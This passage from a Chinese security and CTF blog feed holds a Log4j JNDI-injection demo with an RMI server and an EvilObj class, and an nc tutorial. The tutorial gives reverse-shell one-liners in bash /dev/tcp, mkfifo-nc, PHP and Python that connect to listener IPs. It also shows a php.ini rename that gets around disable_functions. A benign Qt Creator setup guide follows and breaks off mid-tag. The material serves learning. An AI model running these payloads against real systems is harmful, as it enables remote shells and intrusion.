function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">try</span>&#123;<br>            LocateRegistry.createRegistry(<span class="hljs-number">1099</span>);<br>            <span class="hljs-type">Registry</span> <span class="hljs-variable">registry</span> <span class="hljs-operator">=</span> LocateRegistry.getRegistry();<br><br>            System.out.println(<span class="hljs-string">&quot;RMI Listener 1099 port&quot;</span>);<br>            <span class="hljs-type">Reference</span> <span class="hljs-variable">reference</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Reference</span>(<span class="hljs-string">&quot;com.cui.log4jtest.rmi.EvilObj&quot;</span>, <span class="hljs-string">&quot;com.cui.log4jtest.rmi.EvilObj&quot;</span>, <span class="hljs-literal">null</span>);<br><br>            <span class="hljs-type">ReferenceWrapper</span> <span class="hljs-variable">referenceWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ReferenceWrapper</span>(reference);<br>            registry.rebind(<span class="hljs-string">&quot;test&quot;</span>, referenceWrapper);<br><br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;<br>            e.printStackTrace();<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>EvilObj.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> javax.naming.Context;<br><span class="hljs-keyword">import</span> javax.naming.Name;<br><span class="hljs-keyword">import</span> javax.naming.spi.ObjectFactory;<br><span class="hljs-keyword">import</span> java.io.IOException;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EvilObj</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ObjectFactory</span> &#123;<br>    <span class="hljs-keyword">static</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;open a Calculator!&quot;</span>);<br>        <span class="hljs-keyword">try</span> &#123;<br>            Runtime.getRuntime().exec(<span class="hljs-string">&quot;open -a Calculator&quot;</span>);<br>        &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-comment">//这里可以写任意代码，比如木马程序，病毒程序，死循环，后门程序等等。</span><br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">getObjectInstance</span><span class="hljs-params">(Object obj, Name name, Context nameCtx, Hashtable&lt;?, ?&gt; environment)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>log4jDemo1.java</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.logging.log4j.Logger;<br><span class="hljs-keyword">import</span> org.apache.logging.log4j.LogManager;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">log4jDemo1</span> &#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-type">Logger</span> <span class="hljs-variable">logger</span> <span class="hljs-operator">=</span> LogManager.getLogger();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> <span class="hljs-string">&quot;$&#123;jndi:rmi://127.0.0.1:1099/test&#125;&quot;</span>;<br>            logger.info(<span class="hljs-string">&quot;输出的信息是:&#123;&#125;&quot;</span>, str);<br>        &#125;<span class="hljs-keyword">catch</span> (Exception e)&#123;&#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>先启动RMIServer再启动log4jDemo1就会弹出计算器</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072231797.jpg" alt="image-20221002215727110"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202312072231698.jpg" alt="image-20221002215800340"></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>nc命令学习及反弹shell细节</title>
      <link href="/2022/09/27/nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82/"/>
      <url>/2022/09/27/nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82/</url>
      
        <content type="html"><![CDATA[<h1 id="nc命令学习及反弹shell细节"><a href="#nc命令学习及反弹shell细节" class="headerlink" title="nc命令学习及反弹shell细节"></a>nc命令学习及反弹shell细节</h1><table><thead><tr><th align="left">机器名称</th><th align="left">IP地址</th><th>操作系统</th></tr></thead><tbody><tr><td align="left">root@Decemberus</td><td align="left">114.223.4.218</td><td>Centos7</td></tr><tr><td align="left">root@Sloth</td><td align="left">124.223.207.184</td><td>Centos7</td></tr><tr><td align="left">🥣</td><td align="left">内网</td><td>Mac os</td></tr></tbody></table><h2 id="nc命令使用"><a href="#nc命令使用" class="headerlink" title="nc命令使用"></a>nc命令使用</h2><h3 id="版本"><a href="#版本" class="headerlink" title="版本"></a>版本</h3><ul><li><p><code>netcat-traditional</code>:Kali Linux 默认带的就是这个版本，这个版本的 nc 具有<code>-e</code>选项，十分方便反弹 shell 使用</p></li><li><p><code>netcat-openbsd</code>:ubuntu 里默认的 nc 命令指向的是netcat-openbsd。这个版本因为考虑到安全性等原因没有<code>-e</code>选项。</p></li><li><p><code>ncat</code>:CentOS、Red Hat 默认带的是 ncat。目前ncat已经集成到了 nmap 里面，安装完 nmap 后就可以使用<code>ncat</code>命令了</p></li></ul><blockquote><p>mac上自带nc命令指向的是ncat,linux上nc与ncat没什么区别，mac上最好用ncat,options比较全</p></blockquote><h3 id="前提条件及注意事项"><a href="#前提条件及注意事项" class="headerlink" title="前提条件及注意事项"></a>前提条件及注意事项</h3><ul><li><p>只能nc拥有公网ip的机器，或是在同一局域网下的内网机器(可以nc内网ip)</p></li><li><p>获取本机公网ip</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">curl ifconfig.me <br></code></pre></td></tr></table></figure></li><li><p>端口放行：如果是购买了腾讯云服务，要在控制台和宝塔面板同时放行端口(用于TCP连接)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310253657.jpg" alt="image-20220926010406603"></p></li><li><p>需要vps先监听，目标服务器再nc vps，直接nc只能通过udp连接，tcp连接显示拒绝(如果是端口未放行会显示连接超时)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310254528.jpg" alt="image-20220926005629905"></p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310254598.jpg" alt="image-20220926005900622"></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">未放行端口</span><br>[root@Decemberus ~]# nc 124.223.207.184 3345<br>Ncat: Connection timed out.<br></code></pre></td></tr></table></figure></li></ul><h3 id="文字交互"><a href="#文字交互" class="headerlink" title="文字交互"></a>文字交互</h3><p><code>-l</code>：使用监听模式，监控传入的信息</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">nc -l 3344 <span class="hljs-comment"># 监听3344端口</span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310254143.jpg" alt="image-20220926004654073"></p><blockquote><p>只是简单的文字交互，相当于聊天工具，对数据编码没有要求，但无法执行系统命令</p></blockquote><h3 id="命令交互"><a href="#命令交互" class="headerlink" title="命令交互"></a>命令交互</h3><p><code>-e</code>：将传入的信息以命令执行</p><p>将<code>/bin/bash</code>通过 3344 端口来监听，将收到的信息都发送到<code>/bin/bash</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ncat -l -e /bin/bash 3344<br></code></pre></td></tr></table></figure><blockquote><p><code>/bin/bash</code>是shell解释器，根据目标机器，也可以使用<code>/bin/sh</code>或<code>/bin/zsh</code></p><p>访问端可以通过nc该系统的2333端口，输入端指令会传入该系统的&#x2F;bin&#x2F;bash 执行成功后会返回信息，类似于ssh操作连接来该系统一样</p></blockquote><h3 id="持久监听"><a href="#持久监听" class="headerlink" title="持久监听"></a>持久监听</h3><p><code>-k</code>: 客户端断掉连接时，服务端依然保持运行<br><code>-v</code>：现实指令执行过程细节</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat -lvk -e  /bin/bash 2333<br></code></pre></td></tr></table></figure><blockquote><p>客户端使用<code>CTRL + c</code>或<code>CTRL + d</code>断开连接的时候，监听端的 ncat 依然在运行，这样方便客户端下次直接 nc 连进来</p></blockquote><h3 id="文件传输"><a href="#文件传输" class="headerlink" title="文件传输"></a>文件传输</h3><h4 id="上传文件到远程"><a href="#上传文件到远程" class="headerlink" title="上传文件到远程"></a>上传文件到远程</h4><p>root@Sloth远程服务器运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat -l 3344 &gt; hello.txt<br></code></pre></td></tr></table></figure><p>macOS 本地运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat 124.223.207.184 3344 &lt; hello.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255144.jpg" alt="image-20220926011113841"></p><blockquote><p>此时会将 macOS 的文件传输到远程的 CentOS 服务器上，传输完成后，两个 ncat 会话都将终止。</p></blockquote><h4 id="从远程下载文件"><a href="#从远程下载文件" class="headerlink" title="从远程下载文件"></a>从远程下载文件</h4><p>root@Sloth远程服务器运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat -l 3344 &lt; hello.txt <br></code></pre></td></tr></table></figure><p>macOS 本地运行：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">ncat 124.223.207.184 3344 &gt; hello.txt<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255056.jpg" alt="image-20220926011518092"></p><blockquote><p>这里文件传输完成后不会显示任何内容，并且两个 Ncat 实例将继续工作(但不能文字和命令交互)</p></blockquote><h3 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h3><p>ncat 不支持端口范围扫描，但是原始的 nc (mac上可以用brew装netcat)可以扫描端口</p><ul><li><h4 id="范围扫描"><a href="#范围扫描" class="headerlink" title="范围扫描"></a>范围扫描</h4><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255349.jpg" alt="image-20220926012145161"></p><blockquote><p><code>-n</code>: 直接使用ip地址，而不通过域名服务器<br><code>-z</code>: 使用0输入&#x2F;输出模式%，只在扫描通信端口时使用</p></blockquote></li><li><h4 id="单个扫描"><a href="#单个扫描" class="headerlink" title="单个扫描"></a>单个扫描</h4><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255336.jpg" alt="image-20220926012300304"></p></li></ul><h3 id="vps-nc本机失败可能原因"><a href="#vps-nc本机失败可能原因" class="headerlink" title="vps nc本机失败可能原因"></a>vps nc本机失败可能原因</h3><ul><li><p>本机未监听，tcp连接要让本机先在对应端口监听才能建立，而udp不用，这种情况下一般回显</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">Ncat: Connection refused.<br></code></pre></td></tr></table></figure><p>如果使用原始nc，则表现为没有回显，命令直接结束</p></li><li><p>端口未放行:一般回显表现为</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">Ncat: TIMEOUT.<br>或<br>Ncat: Connection timed out.<br></code></pre></td></tr></table></figure><p>如果使用原始nc则是等待较长时间，命令结束，没有回显</p></li><li><p>使用的本机ip不是公网ip</p></li><li><p>经测试，可能是因为端口未放行，这可能需要配置路由器的防火墙</p></li></ul><h3 id="常见options"><a href="#常见options" class="headerlink" title="常见options"></a>常见options</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell">-l 启动监听<br>-p&lt;端口号&gt; 表示指定端口<br>-v 显示指令执行过程<br>-u udp连接<br>-n 直接使用ip地址，不用域名解析<br>-w&lt;超时秒数&gt;   设置等待连线的时间<br>-z  使用0输入/输出模式，只在扫描通信端口时使用<br></code></pre></td></tr></table></figure><h2 id="反弹Shell"><a href="#反弹Shell" class="headerlink" title="反弹Shell"></a>反弹Shell</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>vps监听某个端口，被控制端发起请求到该端口，并将命令行的输入输出传到控制端</p><h3 id="内网弹shell"><a href="#内网弹shell" class="headerlink" title="内网弹shell"></a>内网弹shell</h3><p>ncat的-e 经过简单调整，可以让vps与内网机器进行命令交互</p><p>root@Sloth先监听</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ncat -lvp 3344<br></code></pre></td></tr></table></figure><p>内网的 macOS 运行</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">ncat -w 10 -e /bin/bash 124.221.124.106 3344<br></code></pre></td></tr></table></figure><p>Linux</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">nc  124.221.124.106 3344 -e /bin/sh<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255233.jpg" alt="image-20220926013811064"></p><blockquote><p>如果目标主机linux发行版本没有 -e 参数，还有以下几种方式：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">rm <span class="hljs-regexp">/tmp/</span>f ; mkfifo <span class="hljs-regexp">/tmp/</span>f;cat <span class="hljs-regexp">/tmp/</span>f | <span class="hljs-regexp">/bin/</span>bash -i <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span> | nc x.x.x.x <span class="hljs-number">2333</span> &gt;<span class="hljs-regexp">/tmp/</span>f<br></code></pre></td></tr></table></figure><p><img src="/../../../Pictures/%60nc%E5%91%BD%E4%BB%A4%E8%AF%A6%E8%A7%A3%E5%8F%8A%E5%8F%8D%E5%BC%B9shell%E7%BB%86%E8%8A%82%60/e6c9d24egy1h6kgeanctvj21r80l6tiz.jpg" alt="image-20220927000457356"></p><ul><li><code>rm /tmp/f</code> 删除命令</li><li><code>mkfifo /tmp/f;</code> 在tmp目录下写fifo文件f</li><li><code>/bin/bash -i 2&gt;&amp;1</code> 将&#x2F;bin&#x2F;bash 的标准错误重定向到标准输出</li><li><code>nc x.x.x.x 2333 &gt;/tmp/f</code>将nc监听到的输入 输入到fifo</li><li><code>cat /tmp/f</code> 将执行结果回显</li></ul></blockquote><h3 id="bash弹shell"><a href="#bash弹shell" class="headerlink" title="bash弹shell"></a>bash弹shell</h3><p>这也是常用的反弹shell payload</p><p>⚠️注意：java命令执行时，会根据空格分割参数。因此最好不要直接传类似下面第二条这种</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">bash -i &gt;&amp; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1<br>bash -c &quot;bash -i &amp;&gt; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1&quot;   #适用sh<br><span class="hljs-meta prompt_">#</span><span class="language-bash">适配java的</span><br>String[] s = &#123;&quot;bash&quot;,&quot;-c&quot;,&quot;&#x27;bash -i &amp;&gt; /dev/tcp/124.221.124.106/3344 0&gt;&amp;1&#x27;&quot;&#125;;<br>Runtime.getRuntime().exec(s);<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255967.jpg" alt="image-20220927204310944"></p><table><thead><tr><th>命令</th><th>参数解释</th></tr></thead><tbody><tr><td>bash -i</td><td>产生一个 bash 交互环境</td></tr><tr><td>&gt;&amp;</td><td>将联合符号前面的内容与后面结合然后一起重定向给后者</td></tr><tr><td>&#x2F;dev&#x2F;tcp&#x2F;10.211.55.4&#x2F;2333</td><td>打开<code>/dev/tcp</code>这个文件就类似于发出了一个socket调用，建立一个socket连接,后面跟目标ip和目标端口</td></tr><tr><td>0&gt;&amp;1</td><td>使得攻击方可以看到输入到命令以及执行结果</td></tr></tbody></table><blockquote><ul><li><p>其实<code>/dev/tcp</code>在根目录下并不存在，之所以能在命令中使用，是因为bash源码对其做了相关预定义</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310255199.jpg" alt="image-20220926171832801"></p></li><li><p>如果攻击目标是mac os系统，使用内网弹shell的payload可以成功，bash弹shell的payload可能失败</p><ul><li><p>原因：现在的mac都已经使用zsh作为默认shell，而zsh并没有对<code>/dev/tcp</code>做相关处理，执行payload会回显</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">zsh: no such file or directory: /proc/net/tcp/110.42.158.239/2333<br></code></pre></td></tr></table></figure></li><li><p>如果要使用bash弹shell要先切换当前使用shell，可以<code>sudo su</code>输入当前用户密码切换到root用户，默认使用sh</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310256550.jpg" alt="image-20220926172537373"></p></li><li><p>或者更改shell为bash</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">chsh -s /bin/bash<br></code></pre></td></tr></table></figure></li></ul></li></ul></blockquote><h4 id="其他形式"><a href="#其他形式" class="headerlink" title="其他形式"></a>其他形式</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs shell">exec 5&lt;&gt;/dev/tcp/x.x.x.x/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done<br><br>rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 124.221.124.106 3344 &gt; /tmp/f<br></code></pre></td></tr></table></figure><blockquote><ul><li>第一条命令 建立与x.x.x.x:4444的tcp连接，并将标准输入输出作为device 5的标准输入输出</li><li>第二条cat &lt;&amp;5 获取device5的输入; <code>while read line; do $line 2&gt;&amp;5 &gt;&amp;5</code> 一旦获取到命令便运行 然后将标准输入输出以及标准错误输出到device5中</li></ul></blockquote><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202301310256792.jpg" alt="image-20220926224353002"></p><h3 id="基于编程语言的反弹shell"><a href="#基于编程语言的反弹shell" class="headerlink" title="基于编程语言的反弹shell"></a>基于编程语言的反弹shell</h3><p>1、基于PHP的反弹</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">php -r &#x27;$sock=fsockopen(&quot;ip&quot;,4444);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#x27;<br></code></pre></td></tr></table></figure><p>2、基于python反弹shell</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">python -c &#x27;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;ip&quot;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/bash&quot;,&quot;-i&quot;]);&#x27;<br></code></pre></td></tr></table></figure><blockquote><p>使用socket建立起tcp连接</p><p>os.dup2() 方法用于将一个文件描述符 fd 复制到另一个 fd2，这里将标准输入、标准输出、标准错误都集成到当前socket的文件描述符上,然后再产生一个 bash 交互环境</p></blockquote><p>2、受到disable_functions影响，导致fsockopen或者exec不可用。<br>当监听端收不到连接就是fsockopen被禁用，又或者收到连接后又立马断开则是exec被禁用<br>解决方法：<br>php在命令行中执行时修改 php.ini 是立即生效的，因此我们直接重命名php.ini文件即可:</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">mv /etc/php.ini /etc/php.ini.bak<br></code></pre></td></tr></table></figure><p>当然，文件位置并不是一定在这里。可以把常用位置都试一遍。当然了，实战中可千万不要这么搞，业务烂了就呜呜呜了。</p><p>参考博客:</p><ol><li><a href="https://blog.csdn.net/haoge1998/article/details/124259580?spm=1001.2101.3001.6650.6&utm_medium=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6-124259580-blog-102993592.pc_relevant_aa&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~BlogCommendFromBaidu~Rate-6-124259580-blog-102993592.pc_relevant_aa">反弹shell原理</a></li><li><a href="https://www.sqlsec.com/2019/10/nc.html">nc命令教程</a></li></ol>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> shell </tag>
            
            <tag> nc </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>M1 mac下搭建使用qt creator + QMYSQL驱动</title>
      <link href="/2022/08/06/M1-mac%E4%B8%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8qt-creator-QMYSQL%E9%A9%B1%E5%8A%A8/"/>
      <url>/2022/08/06/M1-mac%E4%B8%8B%E6%90%AD%E5%BB%BA%E4%BD%BF%E7%94%A8qt-creator-QMYSQL%E9%A9%B1%E5%8A%A8/</url>
      
        <content type="html"><![CDATA[<h3 id="💡前提：安装Xcode"><a href="#💡前提：安装Xcode" class="headerlink" title="💡前提：安装Xcode"></a>💡前提：安装Xcode</h3><h2 id="安装homebrew"><a href="#安装homebrew" class="headerlink" title="安装homebrew"></a>安装homebrew</h2><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;<br></code></pre></td></tr></table></figure><p>选择中科大镜像，并安装弹窗中的命令行开发者工具，安装完再执行以上命令</p><p>切换国内安装源</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd &quot;$(brew --repo)&quot; &amp;&amp; git remote set-url origin git://mirrors.ustc.edu.cn/brew.git &amp;&amp; cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-core&quot; &amp;&amp; git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git &amp;&amp; cd &quot;$(brew --repo)/Library/Taps/homebrew/homebrew-cask&quot; &amp;&amp; git remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git &amp;&amp; cd &quot;$(brew --repo)&quot;/Library/Taps/homebrew/homebrew-cask-versions &amp;&amp; git remote set-url origin https://github.com/Homebrew/homebrew-cask-versions.git<br></code></pre></td></tr></table></figure><p>重启终端，下载qt</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">brew install qt<br></code></pre></td></tr></table></figure><p>检验是否安装成功,执行以下命令，回显信息比较多，可以看见路径</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">brew info qt<br></code></pre></td></tr></table></figure><p><img src="/../images/e6c9d24egy1h1ub18t5pfj20vm0jq7a1.png" alt="1"></p><h2 id="安装HomeBrew-Cask"><a href="#安装HomeBrew-Cask" class="headerlink" title="安装HomeBrew-Cask"></a>安装HomeBrew-Cask</h2><p>cask可以安装.app的软件</p><p>方法一：利用国内源手动clone下载（推荐）<br>创建homebrew-cask文件夹<br>进入homebrew目录：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">cd</span> <span class="hljs-string">&quot;<span class="hljs-subst">$(brew --repo)</span>/Library/Taps/homebrew/&quot;</span><br></code></pre></td></tr></table></figure><p>创建homebrew-cask文件夹</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arduino">mkdir homebrew-cask<br></code></pre></td></tr></table></figure><p>开始clone</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">git clone git:<span class="hljs-regexp">//mi</span>rrors.ustc.edu.cn<span class="hljs-regexp">/homebrew-cask.git/u</span>sr<span class="hljs-regexp">/local/</span>Homebrew<span class="hljs-regexp">/Library/</span>Taps<span class="hljs-regexp">/homebrew/</span>homebrew-cask<br></code></pre></td></tr></table></figure><p>方法二：利用官网文件安装<br>从官网上下载<code>homebrew-cask-master.zip</code>压缩包，解压后将文件夹名改为<code>homebrew-cask</code><br>然后将其拷贝放入<code>/usr/local/Homebrew/Library/Taps/homebrew</code>中，与<code>homebrew-core</code>文件夹同级    </p><blockquote><p>官网: <a href="https://github.com/Homebrew/homebrew-cask">https://github.com/Homebrew/homebrew-cask</a></p></blockquote><h2 id="安装qt-creator"><a href="#安装qt-creator" class="headerlink" title="安装qt creator"></a>安装qt creator</h2><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-keyword">brew </span><span class="hljs-keyword">install </span>qt-creator<br></code></pre></td></tr></table></figure><p>安装完发现启动台多了一个软件，打开</p><p><img src="/../images/e6c9d24egy1h1ub7miil3j20bo086wej.png" alt="."></p><h2 id="配置qt-creator"><a href="#配置qt-creator" class="headerlink" title="配置qt creator"></a>配置qt creator</h2><p>打开首选项<img src="/../images/e6c9d24egy1h1ub8lv3wbj20ds0e6gmk.png?" alt="."></p><p>配置kits，主要是Qt Version和Debuggers</p><p>e6c9d24egy1h1ub8lv3wbj20ds0e6gmk<img src="/../images/e6c9d24egy1h1ucbt7jxhj21ef0u0jvk.png" alt="2"></p><h3 id="配置Qt-Version"><a href="#配置Qt-Version" class="headerlink" title="配置Qt Version"></a>配置Qt Version</h3><p>在终端先查看qt路径</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">brew</span> <span class="hljs-literal">info</span> qt<br></code></pre></td></tr></table></figure><p><img src="/../images/e6c9d24egy1h1ucdiut0nj21ce0hoq9l.png" alt="3"></p><blockquote><p>以我这里为例是在<code>/opt/homebrew/Cellar/qt/6.2.3_1</code></p></blockquote><p>进入该文件夹，访问<code>bin</code>文件夹，找到qmake文件，最后将该路径填入Qt version</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/opt/</span>homebrew<span class="hljs-regexp">/Cellar/</span>qt<span class="hljs-regexp">/6.2.3_1/</span>bin/qmake<br></code></pre></td></tr></table></figure><p><img src="/../images/e6c9d24egy1h1ucgvl5bhj21f70u0dk0.png" alt="4"></p><h3 id="配置Debuggers"><a href="#配置Debuggers" class="headerlink" title="配置Debuggers"></a>配置Debuggers</h3><p>一般有默认自动检测到的LLDB，如果没有就添加我图示中Xcode下的LLDB(要先装Xcode)</p><p>路径：<code>/Applications/Xcode.app/Contents/Developer/usr/bin/lldb</code></p><p><img 